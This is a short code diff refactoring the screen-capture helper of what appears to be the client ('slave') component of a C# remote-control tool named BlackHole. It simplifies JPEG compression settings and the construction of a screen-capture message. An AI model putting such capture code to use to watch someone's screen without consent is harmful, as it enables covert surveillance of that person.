@@ -53,7 +53,7 @@ namespace BlackHole.Slave.Helper
             var compressed = CompressImage(screen, quality);
             screen.Dispose();
 
-            return new ScreenCaptureMessage()
+            return new ScreenCaptureMessage
             {
                 ScreenNumber = screenNb,
                 Quality = quality,
@@ -71,12 +71,8 @@ namespace BlackHole.Slave.Helper
         /// <returns></returns>
         private static byte[] CompressImage(Bitmap image, int imageQuality)
         {            
-            var imageQualitysParameter = new EncoderParameter(
-                        System.Drawing.Imaging.Encoder.Quality, imageQuality);
-            
-            var codecParameter = new EncoderParameters(1);
-            codecParameter.Param[0] = imageQualitysParameter;
-
+            var imageQualitysParameter = new EncoderParameter(Encoder.Quality, imageQuality);
+            var codecParameter = new EncoderParameters(1) {Param = {[0] = imageQualitysParameter}};
             var jpegCodec = ImageCodecInfo.GetImageEncoders().First(codec => codec.MimeType == "image/jpeg");
 
             using (var stream = new MemoryStream())
